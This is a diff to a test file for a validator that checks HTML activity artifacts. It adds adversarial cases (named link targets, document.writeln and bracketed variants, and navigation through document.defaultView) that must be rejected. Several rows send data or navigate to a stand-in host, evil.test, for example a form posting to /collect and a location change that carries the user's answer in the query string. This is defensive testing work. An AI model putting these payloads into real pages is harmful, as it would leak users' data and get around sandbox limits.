@@ -96,6 +96,7 @@ describe("activity artifact contracts", () => {
   it.each([
     ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
     ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
+    ["named link target", "<a href='#done' target='activityReport'>Informe</a>", "navigation targets are forbidden"],
     ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
     ["root-relative subresource", "<img src='/activity.js'>", "external or executable URL references are forbidden"],
     ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
@@ -114,12 +115,15 @@ describe("activity artifact contracts", () => {
     ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
     ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
     ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["writeln replacement", "<script>document.writeln('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["bracketed document replacement", "<script>document['writeln']('<main>replacement</main>')</script>", "document.write is forbidden"],
     ["sandbox escape", "<iframe sandbox='allow-same-origin allow-top-navigation' srcdoc='<p>escape</p>'></iframe>", "nested browsing contexts are forbidden"],
     ["template descendants", "<template><iframe srcdoc='<p>escape</p>'></iframe></template>", "nested browsing contexts are forbidden"],
     ["script markup string", "<script>document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc=\"<p>escape</p>\"></iframe>')</script>", "nested browsing contexts are forbidden"],
     ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
     ["self navigation", "<script>location.href = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
     ["window navigation", "<script>window['location'].assign('/replacement')</script>", "self-navigation is forbidden"],
+    ["indirect self navigation", "<script>document.defaultView.location = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
   ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
     const context = buildActivitySessionContext([lessonState]);
     const [candidate] = createActivityArtifactCandidates({
